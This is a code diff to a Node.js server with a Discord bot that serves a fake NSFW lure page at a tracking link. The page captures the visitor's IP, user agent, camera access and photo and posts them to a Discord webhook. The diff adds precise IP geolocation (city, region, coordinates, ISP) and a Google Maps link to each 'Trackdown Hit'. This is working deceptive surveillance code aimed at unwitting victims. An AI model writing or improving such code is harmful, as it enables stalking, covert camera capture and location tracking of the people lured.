@@ -12,10 +12,9 @@ const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const DOMAIN = process.env.DOMAIN;
 
 if (!TOKEN || !WEBHOOK_URL || !DOMAIN) {
-  console.error("❌ Missing one or more environment variables (DISCORD_TOKEN, WEBHOOK_URL, DOMAIN)");
+  console.error("❌ Missing environment variables!");
 }
 
-// Trust proxy - Important for Render, Railway, etc.
 app.set('trust proxy', true);
 app.use(express.json());
 
@@ -26,7 +25,7 @@ app.get('/', (req, res) => {
 
 const trackingLinks = new Map();
 
-// ================== FAKE NSFW PAGE WITH CAMERA ==================
+// ================== FAKE NSFW PAGE ==================
 app.get('/track/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -113,26 +112,44 @@ app.get('/track/:id', (req, res) => {
   res.send(html);
 });
 
-// ================== LOG ENDPOINT ==================
+// ================== LOG ENDPOINT WITH BETTER LOCATION ==================
 app.post('/log', async (req, res) => {
   const { trackId, ip, userAgent, photo, cameraAccess = "Unknown" } = req.body;
   const originalUrl = trackingLinks.get(trackId) || 'Unknown';
 
-  let location = 'Unknown';
+  let city = 'Unknown', region = '', country = '', lat = '', lon = '', isp = 'Unknown';
+
   try {
-    if (ip && ip !== 'Unknown' && ip !== '::1' && !ip.startsWith('127.')) {
-      const geo = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
-      location = `${geo.data.city || ''}, ${geo.data.country_name || ''}`.trim() || 'Unknown';
+    if (ip && ip !== 'Unknown') {
+      // Using ip-api.com (free, no key, returns lat/lon)
+      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,timezone`, { timeout: 6000 });
+      
+      if (geo.data.status === "success") {
+        city = geo.data.city || 'Unknown';
+        region = geo.data.regionName || '';
+        country = geo.data.country || '';
+        lat = geo.data.lat || '';
+        lon = geo.data.lon || '';
+        isp = geo.data.isp || 'Unknown';
+      }
     }
-  } catch (e) {}
+  } catch (e) {
+    console.error("Geo API error:", e.message);
+  }
+
+  const locationText = `${city}, ${region ? region + ', ' : ''}${country}`;
+  const coords = lat && lon ? `(${lat}, ${lon})` : '';
+  const mapsLink = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : '#';
 
   const embed = {
     title: "🎯 Trackdown Hit - NSFW Fake Link",
     color: cameraAccess === "Granted" ? 0x00ff88 : 0xffaa00,
     fields: [
       { name: "IP", value: `\`${ip}\``, inline: true },
-      { name: "Location", value: location, inline: true },
+      { name: "Location", value: `${locationText} ${coords}`, inline: true },
       { name: "Camera", value: cameraAccess, inline: true },
+      { name: "ISP", value: isp, inline: false },
+      { name: "Google Maps", value: mapsLink !== '#' ? `[📍 View on Maps](${mapsLink})` : "Not available", inline: false },
       { name: "Time", value: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false },
       { name: "User-Agent", value: (userAgent || "Unknown").substring(0, 300), inline: false },
       { name: "Original URL", value: originalUrl, inline: false }
@@ -204,14 +221,8 @@ client.login(TOKEN)
   .then(() => console.log("✅ Discord bot logged in"))
   .catch(err => {
     console.error("❌ Discord login failed:", err.message);
-    console.log("⚠️ Web server is still running without bot functionality.");
+    console.log("⚠️ Web server is still running.");
   });
 
-// Prevent crashes
-process.on('unhandledRejection', (reason) => {
-  console.error('Unhandled Rejection:', reason);
-});
-
-process.on('uncaughtException', (err) => {
-  console.error('Uncaught Exception:', err);
-});
+process.on('unhandledRejection', (reason) => console.error('Unhandled Rejection:', reason));
+process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
